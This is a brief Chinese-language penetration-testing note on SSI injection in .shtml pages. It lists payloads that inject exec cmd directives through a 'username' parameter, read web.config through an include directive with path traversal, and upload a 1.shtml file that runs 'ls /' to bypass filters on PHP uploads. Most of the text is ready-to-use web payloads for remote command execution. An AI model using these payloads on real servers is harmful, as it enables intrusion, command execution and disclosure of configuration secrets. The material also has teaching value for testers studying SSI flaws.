

shtml是一种特殊的html。需要运行在支持SSI的服务器，如apache。简单来说就是能根据命令动态回显网页的某个部分，比如时间。
可以注入，用来远程命令执行。 格式：  
```
?username=<!--#exec cmd="命令"-->

?username=<!--#exec cmd="ls"-->

ssi:<--#include file="..\..\web.config" -->
```

^
## **shtml文件上传**
又被称为Apache2 SSI 命令执行
在测试任意文件上传漏洞的时候，目标服务端可能不允许上传php后缀的文件。如果目标服务器开启了SSI与CGI支持，我们可以上传一个shtml文件，并利用<!--#exec cmd="id" -->语法执行任意命令。

文件名：1.shtml
文件内容
```
<!--#exec cmd="ls /" -->
```